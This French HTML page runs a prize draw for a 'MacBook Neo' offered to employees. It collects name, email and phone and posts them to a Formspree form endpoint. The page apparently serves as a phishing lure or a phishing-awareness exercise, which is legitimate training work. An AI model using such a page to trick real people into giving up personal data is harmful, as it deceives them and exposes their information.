<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Jeu concours - MacBook Neo</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #f5f7fa, #e4ecf7);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: white;
      max-width: 520px;
      width: 90%;
      border-radius: 18px;
      box-shadow: 0 12px 30px rgba(0,0,0,0.1);
      padding: 30px;
      text-align: center;
    }

    h1, h2 {
      margin-bottom: 10px;
    }

    p {
      color: #555;
    }

    .btn {
      background: #2563eb;
      color: white;
      border: none;
      padding: 14px;
      border-radius: 10px;
      width: 100%;
      cursor: pointer;
      font-weight: bold;
      margin-top: 15px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    .hidden {
      display: none;
    }
  </style>
</head>

<body>

<div class="card">

  <!-- PAGE 1 -->
  <div id="step1">
    <h1>🎁 Gagnez le dernier MacBook Neo</h1>
    <p>Participation gratuite pour tous les collaborateurs.</p>

    <button class="btn" onclick="showForm()">Participer</button>
  </div>

  <!-- PAGE 2 -->
  <div id="step2" class="hidden">
    <h2>Formulaire de participation</h2>

    <form id="contestForm" novalidate>
      <input type="text" id="nom" placeholder="Nom" required>
      <input type="text" id="prenom" placeholder="Prénom" required>
      <input type="text" id="email" placeholder="Email" required>
      <input type="text" id="telephone" placeholder="Téléphone" required>

      <button type="submit" class="btn">Valider</button>
    </form>
  </div>

  <!-- PAGE 3 -->
  <div id="step3" class="hidden">
    <h2>✅ Bravo !</h2>
    <p>Votre participation a bien été prise en compte.</p>
    <p>Les résultats vous seront communiqués prochainement.</p>
  </div>

</div>

<script>
function showForm() {
  document.getElementById("step1").classList.add("hidden");
  document.getElementById("step2").classList.remove("hidden");
}

document.getElementById("contestForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const nom = document.getElementById("nom").value;
  const prenom = document.getElementById("prenom").value;
  const email = document.getElementById("email").value.toLowerCase();
  const telephone = document.getElementById("telephone").value;

  if (!nom || !prenom || !email || !telephone) {
    alert("Veuillez remplir tous les champs");
    return;
  }

  // ENVOI VERS FORMSPREE
  fetch("https://formspree.io/f/xnjozjby", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      nom: nom,
      prenom: prenom,
      email: email,
      telephone: telephone
    })
  });

  // PAGE FINALE
  document.getElementById("step2").classList.add("hidden");
  document.getElementById("step3").classList.remove("hidden");
});
</script>

</body>
</html>
